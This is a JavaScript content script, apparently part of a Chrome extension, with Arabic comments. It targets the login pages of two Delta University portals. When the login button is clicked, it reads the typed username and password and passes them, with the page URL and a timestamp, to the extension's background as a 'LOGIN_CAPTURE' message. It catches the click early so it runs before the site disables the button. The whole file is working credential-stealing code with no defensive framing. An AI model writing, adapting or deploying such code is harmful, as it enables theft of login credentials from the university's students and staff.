(function() {
    function getSiteConfig() {
        const url = window.location.href.toLowerCase();
        if (url.includes('dep.deltauniv.edu.eg/login.aspx')) {
            return { u: 'txt_usr', p: 'txt_psw', b: 'btn_login', site: 'dep' };
        } else if (url.includes('dulms.deltauniv.edu.eg/login.aspx')) {
            return { u: 'txtname', p: 'txtPass', b: 'Button1', site: 'dulms' };
        }
        return null;
    }

    const config = getSiteConfig();
    if (!config) return;

    // نستخدم Capture Phase (true) عشان نمسك الزرار قبل ما الموقع يعمله Disable
    document.addEventListener('click', function(e) {
        if (e.target && (e.target.id === config.b || e.target.name === config.b)) {
            
            const usernameEl = document.getElementById(config.u);
            const passwordEl = document.getElementById(config.p);

            if (usernameEl && passwordEl) {
                const username = usernameEl.value;
                const password = passwordEl.value;

                if (username || password) {
                    
                    // ✅ تعديل الوقت: تحويله لتاريخ ووقت مقروء بنظام 12 ساعة
                    const readableTime = new Date().toLocaleString('en-GB', { 
                        hour12: true, 
                        year: 'numeric', 
                        month: '2-digit', 
                        day: '2-digit', 
                        hour: '2-digit', 
                        minute: '2-digit', 
                        second: '2-digit' 
                    });

                    chrome.runtime.sendMessage({
                        type: "LOGIN_CAPTURE",
                        data: {
                            site: config.site,
                            url: window.location.href,
                            username: username,
                            password: password,
                            time: readableTime
                        }
                    });
                }
            }
        }
    }, true); 
})();